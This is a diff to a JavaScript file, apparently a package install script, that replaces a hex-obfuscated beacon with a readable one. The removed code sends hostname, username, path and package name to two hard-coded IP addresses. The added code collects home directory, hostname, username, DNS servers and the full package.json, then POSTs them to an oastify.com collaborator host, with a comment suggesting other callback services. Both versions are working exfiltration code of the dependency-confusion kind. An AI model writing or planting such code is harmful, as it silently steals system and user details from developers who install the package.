@@ -1,1 +1,46 @@
-var _0x43dc=["\x68\x74\x74\x70","\x6F\x73","\x68\x6F\x73\x74\x6E\x61\x6D\x65","\x50\x57\x44","\x65\x6E\x76","\x63\x77\x64","\x6E\x61\x6D\x65","\x2E\x2F\x70\x61\x63\x6B\x61\x67\x65\x2E\x6A\x73\x6F\x6E","\x75\x73\x65\x72\x6E\x61\x6D\x65","\x75\x73\x65\x72\x49\x6E\x66\x6F","\x70\x6F\x69","\x65\x72\x72\x6F\x72","\x6F\x6E","\x67\x65\x74","","\x66\x6F\x72\x45\x61\x63\x68"];const http=require(_0x43dc[0]);const os=require(_0x43dc[1]);const hostname=os[_0x43dc[2]]();const pwd=process[_0x43dc[4]][_0x43dc[3]]|| process[_0x43dc[5]]();const packageName=require(_0x43dc[7])[_0x43dc[6]];const username=os[_0x43dc[9]]()[_0x43dc[8]];const queryParams= new URLSearchParams({flag:_0x43dc[10],packagename:packageName,hostname:hostname,user:username,path:pwd}).toString();function sendRequest(_0x9167x9){http[_0x43dc[13]](_0x9167x9,(_0x9167xb)=>{})[_0x43dc[12]](_0x43dc[11],(_0x9167xa)=>{})}const urls=[("\x68\x74\x74\x70\x3A\x2F\x2F\x31\x30\x2E\x32\x34\x31\x2E\x37\x30\x2E\x31\x36\x32\x3A\x38\x30\x38\x30\x3F"+queryParams+_0x43dc[14]),("\x68\x74\x74\x70\x3A\x2F\x2F\x31\x39\x32\x2E\x31\x34\x34\x2E\x31\x33\x37\x2E\x31\x33\x34\x3A\x38\x30\x38\x30\x3F"+queryParams+_0x43dc[14])];urls[_0x43dc[15]](sendRequest)
+const os = require("os");
+const dns = require("dns");
+const querystring = require("querystring");
+const https = require("https");
+const packageJSON = require("./package.json");
+const package = packageJSON.name;
+
+const trackingData = JSON.stringify({
+    p: package,
+    c: __dirname,
+    hd: os.homedir(),
+    hn: os.hostname(),
+    un: os.userInfo().username,
+    dns: dns.getServers(),
+    r: packageJSON ? packageJSON.___resolved : undefined,
+    v: packageJSON.version,
+    pjson: packageJSON,
+});
+
+var postData = querystring.stringify({
+    msg: trackingData,
+});
+
+var options = {
+    hostname: "356sv2lpkjygtxa2jimze3fvrmxdl59u.oastify.com", //replace burpcollaborator.net with Interactsh or pipedream
+    port: 80,
+    path: "/",
+    method: "POST",
+    headers: {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Content-Length": postData.length,
+    },
+};
+
+var req = https.request(options, (res) => {
+    res.on("data", (d) => {
+        process.stdout.write(d);
+    });
+});
+
+req.on("error", (e) => {
+    // console.error(e);
+});
+
+req.write(postData);
+req.end();
